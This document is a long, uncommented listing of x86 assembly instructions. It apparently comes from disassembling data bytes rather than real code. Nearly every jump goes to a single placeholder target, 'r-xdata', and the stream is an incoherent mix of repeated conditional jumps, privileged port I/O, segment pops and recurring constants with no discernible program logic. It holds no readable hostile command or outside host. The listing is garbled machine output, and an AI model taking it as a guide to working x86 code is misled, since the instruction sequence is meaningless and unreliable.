mov [ 0x73737320 ] eax
jae r-xdata
jae r-xdata
jae r-xdata
or ch [ eax + 0x73e3e3f7 ]
jae r-xdata
stosd [ edi ]
jae r-xdata
jae r-xdata
test al 0xf7
jae r-xdata
sbb ecx [ ebx ]
jae r-xdata
or cl [ edx + 0x73e3e3e1 ]
jae r-xdata
mov dl 0x60
jae r-xdata
jae r-xdata
jecxz r-xdata
out dx al
jae r-xdata
loope r-xdata
movsd [ edi ] [ esi ]
fcom [ ebx ]
in al dx
popad
push 0x54ece7ab
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb ebp esp
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in al dx
or ebx [ 0xffffffffb31c1c1f ]
jae r-xdata
pop ds
mul ebx
jae r-xdata
push esp
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffae
adc ecx [ edx ]
int3
cmpsb [ esi ] [ edi ]
salc
jae r-xdata
add eax 0x601c1c1b
cmp ah ch
jae r-xdata
and eax 0xd1f0ae1
pushad
sar [ edx + 0x68e26887 ] cl
xchg [ edi ] bl
sbb ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
push 0xffffffbe
jecxz r-xdata
jae r-xdata
pop ds
fucomi st6
push 0xa10d813
out 0xec eax
jae r-xdata
jae r-xdata
jae r-xdata
pushad
jae r-xdata
jae r-xdata
sbb al 0x1c
cmpsb [ esi ] [ edi ]
jae r-xdata
pop edx
jae r-xdata
jae r-xdata
mov [ 0x1fa66aeb ] eax
or dl cl
xor eax 0x73731c1c
mov ebx edx
mov edx 0x68e26887
sub ecx esp
jecxz r-xdata
jae r-xdata
jae r-xdata
daa
pushad
lahf
mov bl 0x68
and eax 0x1c164a0b
sbb al 0x60
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
or eax 0x661c1c1b
in al dx
jae r-xdata
pushad
sbb al 0x1c
jae r-xdata
in al dx
jae r-xdata
sbb al 0x60
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
out dx eax
test [ edx - 0x42 ] ebp
jae r-xdata
mov ah 0xb3
jae r-xdata
xchg ebp eax
push 0x19600a1b
sbb al 0x1c
sbb edx ebp
in al dx
loope r-xdata
retn
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
mov edx 0xaa323d0
xchg esp esi
jecxz r-xdata
jae r-xdata
jae r-xdata
fsub [ esi - 0x2f9813e5 ]
mul bl
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0x8b
jae r-xdata
jae r-xdata
add eax 0x601c1c1b
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xor al 0xa
jae r-xdata
jae r-xdata
daa
sbb al 0x1c
jae r-xdata
mov esi 0xa3a68ef
jae r-xdata
sbb ecx [ ebx - 0x1c1c1d19 ]
jae r-xdata
or bl [ edi ]
jae r-xdata
in al dx
inc dx
sti
jecxz r-xdata
jae r-xdata
push ebp
adc [ esp + ebx ] ebx
xchg [ edi ] bl
jecxz r-xdata
pushad
mov dh 0xa
loope r-xdata
sbb al 0xb
jae r-xdata
push 0x20d8efa6
push 0xec1c663b
jae r-xdata
pushad
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
pop ds
jae r-xdata
jae r-xdata
push 0xffffffee
jae r-xdata
or dl [ ecx + 0x37 ]
out dx eax
fsub [ eax ]
jae r-xdata
sbb al 0x1c
jmp r-xdata
jae r-xdata
jae r-xdata
push 0xfec40a3a
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb eax 0xb361ecc3
sbb [ esp + ebx ] bl
or edx [ edi ]
cli
jecxz r-xdata
sbb al 0x93
out dx eax
sbb al 0x93
jmp r-xdata
push 0x73202a22
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push ds
sbb al 0x1c
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and ecx [ edx ]
mov ah cl
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x34
jae r-xdata
jae r-xdata
in al dx
and [ edx ] cl
jae r-xdata
jae r-xdata
jae r-xdata
cmp eax 0x1c326e0a
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
push 0x18d60b1b
jae r-xdata
jecxz r-xdata
sbb al 0x1c
sbb [ esp + ebx ] bl
jae r-xdata
jecxz r-xdata
in al dx
and bp sp
jpe r-xdata
jae r-xdata
pop ds
jae r-xdata
mov bl 0x1c
or ch [ edx - 0x12 ]
jae r-xdata
jae r-xdata
push ecx
aaa
jae r-xdata
jae r-xdata
mov ebx esp
jae r-xdata
sbb al 0xa6
in al dx
popad
mov bl 0x18
sbb al 0x1c
push 0xe2e78b1b
outsb
jcxz r-xdata
sbb [ esp + ebx ] bl
or edx esi
jae r-xdata
shr [ edx ] 0x1
jae r-xdata
jae r-xdata
out dx eax
jae r-xdata
dec eax
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
cmp ah ch
sbb al 0x66
jae r-xdata
outsb
out dx al
jae r-xdata
cmp cl [ edx ]
jae r-xdata
push 0x326e0a3d
sbb al 0x1c
mov [ 0xffffffffe3e70f0a ] eax
jae r-xdata
enter 0x20e2 0x73
jae r-xdata
mov esp ebx
jae r-xdata
out dx eax
jae r-xdata
sti
jpo r-xdata
or dh [ 0x73e3e3f2 ]
pushad
jae r-xdata
sbb ebx [ esi ]
jae r-xdata
sbb bl [ esp + ebx ]
mov ecx [ esi ]
sbb [ eax - 0x5ef44a8b ] al
sbb [ esp + ebx ] bl
mov ecx [ eax - 0x4a5e5e17 ]
rcr [ edx ] 0x1
sbb al 0x1c
jecxz r-xdata
jae r-xdata
or dh [ edi - 0x14 ]
jecxz r-xdata
jae r-xdata
push cx
mov ecx 0x6a858089
push 0xec156613
or edx eax
sbb bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
daa
sbb al 0x60
jae r-xdata
or [ ecx ] 0xffffffe3
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
out 0x8b eax
jecxz r-xdata
jae r-xdata
xor bl [ esp + ebx ]
jae r-xdata
sbb al 0x96
jmp r-xdata
or esp [ esi + 0x5 ]
sbb al 0x1c
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jmp r-xdata
leave
jecxz r-xdata
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
mov dh 0x68
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb
inc ebx
in al dx
jecxz r-xdata
add [ esp + ebx ] bl
jecxz r-xdata
jae r-xdata
xchg esi eax
out dx eax
sbb al 0x73
jg r-xdata
xor bl [ esp + ebx ]
or ch [ esi + 0x731c1c33 ]
mov edi esp
mov esp ebx
shl ebx cl
add eax 0x766e1c1c
adc ebx [ eax ]
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xec1c663b
shl [ ebx ] 0x1
outsb
or cl [ eax + 0x1 ]
jecxz r-xdata
sbb al 0xb5
jmp r-xdata
iretd
fwait
loope r-xdata
mul ebx
jecxz r-xdata
push ebx
cmp al 0x1c
sbb al 0x60
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
outsb
outsb
adc ebx [ eax ]
jecxz r-xdata
mov [ ebx - 0x1c18f0f6 ] esp
jae r-xdata
pushad
sahf
pop ds
jecxz r-xdata
or edi [ ebp - 0x451c1c18 ]
mov edx 0x67ec2366
mov bl 0x32
movsd [ di ] [ si ]
xor bl [ esp + ebx ]
sbb al 0x96
pop ds
mov bl 0xa
jbe r-xdata
sbb al 0x6e
jae r-xdata
jae r-xdata
outsd
jecxz r-xdata
dec edi
jae r-xdata
daa
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
loop r-xdata
punpckldq mmx1 [ edi ]
outsd
out 0xe3 eax
jecxz r-xdata
or cl [ edi ]
jae r-xdata
jne r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata

jae r-xdata
loopne r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
pushad
jae r-xdata
jae r-xdata
mov ah 0xa
out 0xe3 eax
sbb al 0x1c
mov edx 0xec2366ba
mov bl 0x32
mov edx 0x13ae6a85
or cl ah
xor eax 0x6e731c1c
sub bx [ esi ]
jae r-xdata
jae r-xdata
dec ebx
and bl 0xe3
and al 0xa7
jae r-xdata
daa
test [ edx ] 0x1c1c1fcf
jae r-xdata
jae r-xdata
jecxz r-xdata
jne r-xdata
mov edx 0x7a1c1c7d
jecxz r-xdata
outsb
jae r-xdata
mul [ esi + 0x23 ]
or dl bh
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
cmc
push 0xa66a8521
sti
or dl [ ebp + 0x731c1c32 ]
jae r-xdata
mov [ ecx + edi * 4 + 0x6a858089 ] ecx
sbb al 0x1c
jae r-xdata
jae r-xdata
xchg esi eax
or ebx [ esp + esi * 2 ]
jpo r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
fsub [ eax ]
in al dx
adc al 0x1a
mov ah 0xb1
jae r-xdata
jae r-xdata
pop edx
sbb al 0xe3
jecxz r-xdata
mov edx 0x7a1c1c7d
jae r-xdata
push 0x1ce38913
and ecx [ edx ]
jae r-xdata
add [ esp + ebx ] ebx
jae r-xdata
scasb [ edi ]
xor ebx [ esp + ebx ]
jae r-xdata
sbb al 0x97
jae r-xdata
jae r-xdata
or bh [ ecx + 0x39 ]
sbb al 0x1c
jae r-xdata
out 0x8b eax
jecxz r-xdata
sbb al 0x1c
jae r-xdata
outsb
jae r-xdata
jae r-xdata
fsub [ esi + 0x35d70aeb ]
sbb al 0x1c
jae r-xdata
and [ edx ] ecx
or cl [ ebx - 0x1a ]
jecxz r-xdata
or ch dl
jmp ebx
jecxz r-xdata
jae r-xdata
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
xlat
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
pop ds
or cl [ edi ]
jmp 0x73ba2621
jae r-xdata
jae r-xdata
jae r-xdata
cmp [ esp + ebx ] ebx
jae r-xdata
jecxz r-xdata
or ebx esp
jecxz r-xdata
jecxz r-xdata
fidivr [ esi - 0x76981311 ]
retn
jae r-xdata
sbb al 0xa7
jecxz r-xdata
and esi [ ebx - 0x764a1d77 ]
jae r-xdata
jae r-xdata
push 0x9d0abc22
pop es
sbb al 0x1c
in al 0xe3
jecxz r-xdata
and ah ch
sbb al 0x73
jae r-xdata
jae r-xdata
sbb eax 0xab51c1c
mov eax 0x7373202a
jae r-xdata
out 0x1c eax
cmpsd [ esi ] [ edi ]
push 0xe0610a0f
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
nop [ ebx + esi * 2 ] ebx
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0xa
xor eax 0x73e3e3f2
jae r-xdata
jae r-xdata
jae r-xdata
or edx [ esi ]
jae r-xdata
jecxz r-xdata
mov ch 0x9b
jae r-xdata
jae r-xdata
outsb
sbb al 0x73
jae r-xdata
mov esp ebx
jecxz r-xdata
mov edi 0x67ecf7c7
outsd
or bl [ ebx + 0x73e3e3e1 ]
loop r-xdata
jae r-xdata
jmp ebx
jecxz r-xdata
loopne r-xdata
mov edx esp
jae r-xdata
or al [ ebp + ebx + 0x1c ]
jae r-xdata
jae r-xdata
jae r-xdata
jmp edx
jae r-xdata
sbb al 0x73
or al [ ebp + ebx + 0x1c ]
jae r-xdata
pop ebp
out 0xe3 eax
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
mov bl 0x89
jae r-xdata
mov eax 0xae3e3e2
jae r-xdata
and bh [ edx + ecx + 0x1c1c079d ]
jae r-xdata
jecxz r-xdata
mov bl 0x89
loope r-xdata
jae r-xdata
imul ebp ebx 0x68
cmpsb [ esi ] [ edi ]
pop ds
mov [ 0xa1fa66a ] eax
add eax 0x731c1c0c
daa
jae r-xdata
jae r-xdata
sbb al 0x97
cmp eax 0x27601c1c
out dx eax
mov esp ebx
arpl bx sp
jecxz r-xdata
jae r-xdata
or bl dl
cmp ebx [ esp + ebx ]
fwait
imul esp edi 0xffffffda
shl [ ecx ] 0x1
push 0xf3961422
movsd [ edi ] [ esi ]
xor [ edx ] cx
stc
jae r-xdata
push ebp
jae r-xdata
jae r-xdata
out dx eax
in al dx
mov ebx eax
jecxz r-xdata
or cl [ esi + 0x73e3e3f0 ]
jae r-xdata
or [ 0x480a1c1c ] 0xe3f2
jae r-xdata
or [ ds : esp + ebx ] ebx
bound bx [ 0xab51c1c ]
mov ch 0x89
jae r-xdata
xchg edi eax
jae r-xdata
sbb eax 0x73731c1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
jae r-xdata
inc esp
jae r-xdata
loope r-xdata
sub ch ah
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x75
mov eax esp
loop r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
push esp
das
cmp eax 0x1c40348e
jae r-xdata
jae r-xdata
or ah bl
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ds
loop r-xdata
aaa
jae r-xdata
scasb [ edi ]
pop ds
mov dl 0xb3
mov ecx esp
mov edi [ 0x1c40348e ]
jae r-xdata
sbb al 0x96
lea eax [ ebp - 0x5c385896 ]
jae r-xdata
stosd [ edi ]
jae r-xdata
or eax 0x480a1c1c
jae r-xdata
jae r-xdata
sti
jae r-xdata
jae r-xdata
or ah [ eax + 0x1d ]
sbb al 0x1c
jae r-xdata
mov ch 0x97
jae r-xdata
jae r-xdata
jae r-xdata
or [ 0x480a1c1c ] 0x73e3e3f2
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
xor eax [ bp + di ]
sub ch ah
jae r-xdata
mov dl 0xb3
test [ edx - 0x59 ] ebp
jae r-xdata
mov ax 0xe3e2
jecxz r-xdata
movsb [ edi ] [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
fiadd [ ebx - 0x131c1cf7 ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
outsb
sub bx [ esi ]
pushad
push 0xffffffa7
jae r-xdata
mov bl 0x85
push 0xffffffa7
mov ah 0xb0
sbb al 0x75
jae r-xdata
jecxz r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
or al [ esi + 0x5 ]
jae r-xdata
sbb al 0xb5
jae r-xdata
jae r-xdata
jae r-xdata
out 0x6e eax
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x97
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push 0xffffffa7
jae r-xdata
pop di
sbb [ esp + ebx ] ebx
or dl [ ebx + 0x731c1c36 ]
jae r-xdata
cmpsb [ esi ] [ edi ]
mov edi esp
cmpsd [ esi ] [ edi ]
sar ebx cl
or cl [ edx + ebx + 0x1c ]
sbb al 0x73
bound ecx [ edi ]
in al dx
jae r-xdata
psllq mm4 mm7
mov al 0x1c
jne r-xdata
dec ebx
out 0xe3 al
jecxz r-xdata
ror [ edx ] cl
pop es
jae r-xdata
sbb al 0x1c
mov bl 0x1c
sub ebx [ esi ]
mov edx 0xec2366bc
jl r-xdata
cld
mov ebx edx
or al [ edi ]
jae r-xdata
sbb al 0x1c
or cl cl
sbb [ esp + ebx ] bl
mov [ ebx + 0x1fa66a85 ] ebx
test [ edx - 0x52 ] ebp
adc eax 0x7a66eba
mov bl 0xa
and edi esi
jecxz r-xdata
sub ebx [ esi ]
jae r-xdata
jae r-xdata
test [ edx - 0x59 ] ebp
jae r-xdata
dec eax
jae r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
jae r-xdata
add eax 0x73731c1c
jae r-xdata
xchg edi eax
jae r-xdata
or cl [ eax - 0xe ]
jae r-xdata
jae r-xdata
inc esi
jae r-xdata
and ebp esp
jae r-xdata
sbb al 0x1c
xor eax [ ebx ]
jae r-xdata
jecxz r-xdata
adc ecx [ ecx - 0x644ae31d ]
sbb al 0x1c
or esi [ ebx + 0x5 ]
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
or esi [ ebx + 0x6f6e6eb5 ]
push ds
sbb al 0x1c
or esp [ esi + 0x5 ]
sbb al 0x1c
mov edx 0x4930aba
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ebx 0x6a85e289
cmpsd [ esi ] [ edi ]
in al dx
cmpsd [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
outsb
cmp edi eax
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sub [ esp + ebx ] bh
jae r-xdata
jae r-xdata
pushad
lahf
sbb [ esp + ebx ] ebx
jecxz r-xdata
in al dx
jae r-xdata
arpl bx sp
mov [ 0xffffffff85e289bb ] eax
push 0xffffffa7
jae r-xdata
mov al [ 0xfffffffff365ecfb ]
jae r-xdata
jae r-xdata
outsb
sbb al 0xb
jae r-xdata
jae r-xdata
jae r-xdata
outsb
jecxz r-xdata
jae r-xdata
mov eax 0x7373202a
sbb al 0x6e
cmp al 0x1c
jae r-xdata
pushad
sahf
jae r-xdata
cmpsd [ esi ] [ edi ]
out dx eax
jg r-xdata
and bp sp
pop si
cmpsd [ esi ] [ edi ]
pushad
xchg edi eax
jecxz r-xdata
in al dx
jae r-xdata
add [ esp + ebx ] bl
fisub [ eax - 0xc9a1305 ]
jae r-xdata
add eax 0x68e3e3ef
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
push 0x63681ba6
jae r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
push 0xd00aebae
push ds
sbb al 0x1c
mov edx [ esi ]
sbb al 0x1c
jae r-xdata
mov ah 0xb3
push ebx
push ds
sbb al 0x1c
or ebp [ edx ]
sbb al 0x1c
and bp sp
adc ax 0x9e0a
adc eax 0x73731c1c
sti
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
push 0xffffffa6
pop ds
pushad
cmpsb [ esi ] [ edi ]
pop ds
out 0xec eax
push esp
in al dx
cmp eax 0x6e1c1c0e
outsb
jae r-xdata
pop es
mov bl 0x68
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
inc edi
sbb ebp [ eax + 0x63 ]
jae r-xdata
sahf
sub ecx [ edx ]
push ebx
cmp al 0x1c
sbb al 0x73
jae r-xdata
jae r-xdata
scasb [ edi ]
jmp r-xdata
in al dx
and eax 0x6e1c1c03
adc bx [ eax ]
sbb al 0x1c
or eax [ 0x68e3e3ef ]
and esp [ ebx + 0x7373202a ]
jae r-xdata
adc al 0x3b
clc
mov ah 0x97
jae r-xdata
in al dx
jae r-xdata
mov dl 0x1c
xchg esi eax
and ecx [ edx ]
in eax 0x1b
sbb al 0x1c
add [ gs : esp + ebx ] bl
test [ esi + 0x15 ] esp
or bl [ esi + 0x731c1c15 ]
pop ds
mov bl 0xa
dec esp
outsb
and eax 0x1c0df20b
jae r-xdata
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
or ah ch
sbb ebx [ esp + ebx ]
out dx al
and ebp ebx
arpl [ edi - 0x1d ] ax
jecxz r-xdata
jae r-xdata
or dl [ ebx + 0x3c ]
sbb al 0x1c
mov al 0xa
cmp bh bh
jecxz r-xdata
or ah [ ebx + ebp * 8 + 0x66ece3e3 ]
jae r-xdata
push 0xffffff9e
jae r-xdata
sbb al 0x1c
xor al 0x3
jae r-xdata
in al dx
mov dh 0xa
cmpsb [ esi ] [ edi ]
cmp [ esp + ebx ] bl
out 0xe3 al
or ch dh
jae r-xdata
or eax 0xef0a1c1c
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
pushad
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffff9e
pop ds
sbb al 0xb5
jmp r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
jae r-xdata
jae r-xdata
and ebp ecx
outsb
cmpsd [ esi ] [ edi ]
shl [ ebx ] 0x1
push 0xffffffa7
jae r-xdata
sbb al 0x1c
jae r-xdata
push 0xdf20b25
jae r-xdata
jae r-xdata
jae r-xdata
mov edi esp
jecxz r-xdata
jae r-xdata
jae r-xdata
je r-xdata
push 0xb5b0b20f
and [ ecx ] ecx
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
push 0xffffffa6
jae r-xdata
jecxz r-xdata
jae r-xdata
or ch bh
jae r-xdata
or esi edx
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
xor eax 0x961c1c1c
pop ss
sbb al 0xb4
mov bl 0x89
sbb al 0xa

jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
or al [ eax - 0x1b ]
jecxz r-xdata
sbb al 0x1c
or ch dl
cmp eax 0x73731c1c
sbb al 0x1c
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
push 0xef0f600f
jae r-xdata
adc eax 0x85bb8689
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
or eax 0xef0a1c1c
jae r-xdata
mov bl 0x1c
xchg esi eax
pop es
sbb al 0xb4
push 0xffffffa6
pop ss
or bl [ esi - 0x49e3e3d4 ]
or al [ ecx + 0x3c ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
adc ebx [ esp + ebx ]
xchg esp eax
adc [ ecx + 0x57a62486 ] 0xbb
xchg [ ebp + 0x5ba624b5 ] cl
jae r-xdata
jae r-xdata
sbb al 0xb3
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ah 0xb
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ecx 0x720a8c89
aaa
jae r-xdata
jae r-xdata
sahf
out dx eax
jecxz r-xdata
out dx eax
jecxz r-xdata
jae r-xdata
pushad
pxor mmx1 [ ecx + 0xd310aeb ]
sbb al 0x1c
jae r-xdata
jae r-xdata
xor ebp esp
push esp
pushad
and ah cl
or cl [ edx + 0x731c1c15 ]
jae r-xdata
sub bh ch
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0xa
jae r-xdata
mov bl 0x6a
jae r-xdata
cli
mov [ edx + ecx ] ebx
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ edx ] cl
jno r-xdata
jpe r-xdata
sahf
sbb al 0x96
jae r-xdata
aas
jae r-xdata
mov ebx esi
outsb
daa
mov bl 0xa
mov ecx 0x731c1c18
jae r-xdata
das
and al 0xa6
jae r-xdata
lahf
jae r-xdata
jae r-xdata
mov [ edx ] cs
jae r-xdata
movsb [ edi ] [ esi ]
jae r-xdata
out dx eax
int3
cld
jae r-xdata
jecxz r-xdata
jae r-xdata
or ah [ edi + ebp * 8 + 0x6e73e3e3 ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
xor esi [ ebx + 0x1c14060a ]
sbb al 0x73
jae r-xdata
sbb al 0x1c
adc [ esp + ebx ] bl
adc ch [ edi ]
sbb al 0x1c
mov edx 0x66ec2366
pop esi
xor al 0x3
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
dec ecx
jmp 0xffffffff88ba2984
imul edx [ ebx - 0x1d ] 0xffffffe3
jae r-xdata
add eax 0xf5810abb
jecxz r-xdata
sbb eax [ ebp + 0xa1b9e6a ]
sub cl [ edx ]
jae r-xdata
in al dx
sbb al 0x1c
jae r-xdata
jmp r-xdata
xchg esi eax
sbb al 0x1c
mov esp ebx
jecxz r-xdata
push 0xffffff9e
jae r-xdata
jae r-xdata
jecxz r-xdata
mov esi 0xeb280a3b
jae r-xdata
sub bl ch
or esi [ edi ]
mov bl 0x1c
jae r-xdata
mov edx 0x6a85bb89
cmpsb [ esi ] [ edi ]
pop ss
test [ edx - 0x52 ] ebp
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
sbb al 0x73
sbb al 0x1c
jb r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
and edi [ ebp + 0x73202ab8 ]
outsb
jae r-xdata
add ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
mov eax 0x7373202a
sub ah [ eax ]
jae r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
or bl [ eax + 0x731c1c30 ]
jae r-xdata
or dh [ ecx + 0xf ]
outsb
cmpsb [ esi ] [ edi ]
cmp esi [ ebx + 0x6a3f961c ]
jae r-xdata
sbb al 0x1c
mov [ ebx - 0x7a5b7647 ] ebx
push 0xffffffb6
jns r-xdata
push ds
lahf
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
xor esi [ ebp + 0x3a260bb3 ]
sbb al 0x1c
mov ch 0x8b
adc bh dh
mov ah [ ebx - 0x1cd8abe4 ]
jecxz r-xdata

or ch [ eax ]
jae r-xdata
jae r-xdata
scasb [ edi ]
scasb [ edi ]
jae r-xdata
mov bl 0x1c
je r-xdata
xchg di ax
sbb [ esp + ebx ] bl
jae r-xdata
sbb al 0x1c
jecxz r-xdata
mov bl 0x6e
jae r-xdata
jae r-xdata
jae r-xdata
scasb [ edi ]
jae r-xdata
jae r-xdata
out 0xa eax
movsb [ edi ] [ esi ]
in al dx
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
sahf
pop ds
in al dx
sbb al 0xf0
jecxz r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
sub esi [ ebx - 0x5f5e377 ]
jae r-xdata
sbb al 0xd0
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
dec edi
push 0xab3eb96
mov dh 0x41
jae r-xdata
jae r-xdata
mov ah 0xb3
mov esp 0x73202abd
jae r-xdata
sbb al 0xb4
mov bl 0xbc
mov ebp 0x7373202a
jae r-xdata
mov ecx 0x45ae6a85
mov [ esi + 0x7fb66a85 ] edx
mov ecx 0x7db66a85
test [ edx - 0x5a ] ebp
dec ecx
push 0x8923d035
xchg edi eax
test [ edx - 0x4a ] ebp
inc ecx
jae r-xdata
pushad
jae r-xdata
jmp r-xdata
jae r-xdata
outsb
mov ebx 0xf710a86
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
pop edi
jecxz r-xdata
daa
fisttp [ edx ]
inc ebp
xor eax 0x6a851c1c
scasb [ edi ]
cmpsb [ esi ] [ edi ]
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata

jae r-xdata
jae r-xdata
mov ah 0xb0
mov ah 0x89
sbb al 0xa
0x731c1c3d 0x7373
jae r-xdata
jae r-xdata
and ebp [ edx ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and edi [ ebp + edi * 4 + 0x73202ab8 ]
jae r-xdata
test [ esi + 0x2a ] esp
push 0xffffffbe
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb3
jae r-xdata
cwde
xor [ esp + ebx ] bl
sub cl [ edx ]
jae r-xdata
cmp ecx [ edx ]
fwait
push ds
sbb al 0x1c
mov al 0xb3
or al dh
call 0x73ba2bc4
sbb al 0x74
or esp ebx
jecxz r-xdata
jae r-xdata
shl [ ebx ] 0x1
mov ebp 0x73202ab8
jae r-xdata
jae r-xdata
or bl [ eax - 0x5 ]
jecxz r-xdata
sbb al 0x1c
or ah [ ebx + 0x731c1c10 ]
mov [ ebx + 0x17a66a85 ] edi
jae r-xdata
jae r-xdata
jae r-xdata
or bh dl
and [ ebx + 0x73 ] dh
pushad
mov esp ebx
shl ebx cl
jecxz r-xdata
jae r-xdata
pop ds
or al [ ebp + 0x7373e3e3 ]
jae r-xdata
pop ss
push 0xffffff9e
insd
or al 0x1c
sbb al 0xb2
sbb al 0x96
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
mov edx ebp
jecxz r-xdata
mov bl 0xa
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
outsb
jae r-xdata
test [ edx - 0x5a ] ebp
push 0xffffffae
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + 0x731c1c16 ]
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb esp eax
scasb [ edi ]
pop ds
xor esp edx
loop r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x6e
sahf
cmp ebp [ esi + 0x6e ]
push ebx
push ds
sbb al 0x1c
or ebx [ ecx ]
sub ebx [ esp + ebx ]
and bp sp
pop ds
cmp [ esp + ebx ] ebx
or bh [ eax + 0x731c1c33 ]
jae r-xdata
sub bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and bp sp
or esi ebx
jae r-xdata
jae r-xdata
add esi [ ebx + 0x1897666e ]
sbb al 0x1c
sub edx [ ecx + 0x24aeb586 ]
and al 0xa6
inc ebp
jae r-xdata
or edx eax
and ecx [ edx ]
inc eax
in eax 0xe3
jecxz r-xdata
jae r-xdata
mov dl 0xb0
